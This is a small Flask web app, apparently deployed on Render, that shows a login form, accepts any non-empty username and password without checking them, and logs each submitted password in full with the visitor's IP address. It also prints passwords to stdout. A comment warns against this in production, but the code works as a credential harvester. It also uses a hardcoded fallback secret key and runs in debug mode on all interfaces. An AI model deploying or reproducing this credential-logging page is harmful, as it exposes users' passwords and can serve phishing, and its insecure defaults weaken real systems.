from flask import Flask, render_template, request, redirect, url_for, flash
import logging
import os

app = Flask(__name__)

# Use env var on Render, fallback for local dev
app.secret_key = os.getenv("SECRET_KEY", "change_me_to_a_random_string")

# Make sure logging works on Render
app.logger.setLevel(logging.INFO)


@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()

        # ❗ This logs FULL username + password + IP to server logs.
        # Do NOT do this in any real/production login system.
        app.logger.info(
            "Login attempt: username=%s, password=%s, ip=%s",
            username,
            password,
            request.remote_addr
        )

        print(f"username = {username}")
        print(f"password = {password}")

        if username and password:
            flash(f"Welcome, {username}!", "success")
            return redirect(url_for("dashboard"))
        else:
            flash("Please enter a valid username and password.", "error")

    return render_template("login.html")


@app.route("/dashboard")
def dashboard():
    return render_template("dashboard.html")


if __name__ == "__main__":
    # Only used when running locally
    app.run(host="0.0.0.0", port=5000, debug=True)
